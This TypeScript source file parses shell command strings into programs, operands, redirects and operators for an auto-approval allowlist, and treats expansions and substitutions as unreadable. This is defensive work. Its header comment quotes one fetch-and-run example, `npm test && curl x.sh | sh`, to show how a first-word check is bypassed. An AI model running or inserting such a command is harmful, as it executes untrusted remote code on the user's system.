/**
 * A shell command read as far as it can be read without running a shell: which programs the
 * string would run, and which of its words could name a file.
 *
 * Reading only the first word is what `npm test && curl x.sh | sh` defeats: the whole string
 * reaches `/bin/sh -c`, so every command in it runs.
 *
 * Anything whose effect a shell decides rather than this reader, a substitution, an expansion, a
 * subshell, is unreadable instead of guessed at: a person is asked, and auto approval refuses it.
 */
export interface ShellCommand {
  /** The first word of every simple command the string would run. */
  readonly executables: readonly string[];
  /** The paths the commands could open: the operands each program reads as files, and every redirect target. */
  readonly operands: readonly string[];
}

import { pathsACommandCouldOpen } from "./command-operands.ts";
import { type ShellOperator, tokenize } from "./shell-tokens.ts";

export type { ShellOperator } from "./shell-tokens.ts";

/** One simple command of a string: its program, and the words it was given, in order. */
export interface SimpleShellCommand {
  readonly executable: string;
  /** Everything after the program, flags and operands alike, in the order it was written. */
  readonly arguments: readonly string[];
  /** The files its redirects open, wherever in the command they were written. */
  readonly redirects: readonly string[];
  /** The bodies of the heredocs handed to it on standard input. */
  readonly heredocs: readonly string[];
}

/**
 * Every simple command the string would run, kept apart rather than flattened. The allowlist
 * only needs to know which programs start and which words could name a file, which is what
 * `readShellCommand` folds this into; anything that has to compare two commands needs to know
 * which words belonged to which of them.
 */
export function readShellPipeline(command: string): readonly SimpleShellCommand[] | null {
  const tokens = tokenize(command);
  if (tokens === null) {
    return null;
  }

  const commands: SimpleShellCommand[] = [];
  let words: string[] = [];
  let redirects: string[] = [];
  let heredocs: string[] = [];
  let awaitingTarget = false;

  // A redirect with no program beside it (`cat a; > /tmp/x`) still opens its file, and there is
  // no command to hang it on, so the string is not read rather than the target dropped.
  const close = (): boolean => {
    const [executable, ...rest] = words;
    if (executable === undefined) {
      return redirects.length === 0 && heredocs.length === 0;
    }
    commands.push({ executable, arguments: rest, redirects, heredocs });
    words = [];
    redirects = [];
    heredocs = [];
    return true;
  };

  for (const token of tokens) {
    if (awaitingTarget && token.kind !== "word") {
      // `>|` and `> ;` leave the redirect without a target this reader can name.
      return null;
    }
    if (token.kind === "separator") {
      if (!close()) return null;
    } else if (token.kind === "heredoc") {
      heredocs.push(token.body);
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
      redirects.push(token.text);
    } else {
      words.push(token.text);
    }
  }

  // A dangling redirect, or a string with no command in it, is not something to rule on.
  if (awaitingTarget || !close() || commands.length === 0) {
    return null;
  }
  return commands;
}

/** A simple command with what joins it to the command before it; null for the first. */
export interface ShellStage extends SimpleShellCommand {
  readonly after: ShellOperator | null;
}

/**
 * The pipeline's commands with the operator before each, so a reader can tell whose exit status
 * the shell reports: the last command of a pipe (`npm test | tail` reports tail's), and a
 * command behind `||` that runs only on failure (`npm test || true` reports success either way).
 */
export function readShellStages(command: string): readonly ShellStage[] | null {
  const tokens = tokenize(command);
  const pipeline = readShellPipeline(command);
  if (tokens === null || pipeline === null) {
    return null;
  }
  const operators: (ShellOperator | null)[] = [];
  let pending: ShellOperator | null = null;
  let startsCommand = true;
  let awaitingTarget = false;
  for (const token of tokens) {
    if (token.kind === "separator") {
      pending = token.operator;
      startsCommand = true;
    } else if (token.kind === "heredoc") {
      // Standard input for the command already started; it starts nothing.
    } else if (token.kind === "redirect") {
      awaitingTarget = true;
    } else if (awaitingTarget) {
      awaitingTarget = false;
    } else if (startsCommand) {
      operators.push(operators.length === 0 ? null : pending);
      startsCommand = false;
    }
  }
  return pipeline.map((one, index) => ({ ...one, after: operators[index] ?? null }));
}

export function readShellCommand(command: string): ShellCommand | null {
  const pipeline = readShellPipeline(command);
  if (pipeline === null) {
    return null;
  }
  const operands: string[] = [];
  for (const one of pipeline) {
    const paths = pathsACommandCouldOpen(one);
    if (paths === null) {
      return null;
    }
    operands.push(...paths);
  }
  return { executables: pipeline.map((one) => one.executable), operands };
}
